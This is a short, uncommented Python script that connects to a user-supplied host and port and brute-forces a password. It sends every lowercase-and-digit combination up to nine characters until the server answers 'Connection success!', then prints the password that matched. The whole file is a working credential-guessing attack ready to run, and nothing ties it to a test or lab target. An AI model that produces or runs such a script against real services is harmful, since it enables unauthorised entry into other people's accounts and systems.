import argparse
import socket
import itertools
import string


# Password Generator
def password_generator(max_length=10):
    # Set Complexity
    lowercase = list(string.ascii_lowercase)
    digits = list(string.digits)

    for i in range(1, max_length):
        complexity = itertools.chain(lowercase, digits)
        for passwd in itertools.product(complexity, repeat=i):
            yield "".join(passwd)


# Parse Arguments
parser = argparse.ArgumentParser()
parser.add_argument("hostname", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

# Connect
address = (args.hostname, args.port)
with socket.socket() as client_socket:
    client_socket.connect(address)
    gen_password = password_generator()

    while True:
        password = next(gen_password)
        client_socket.send(password.encode())
        response = client_socket.recv(1024)
        response = response.decode()
        if response == "Connection success!":
            print(response)
            print(password)
            break
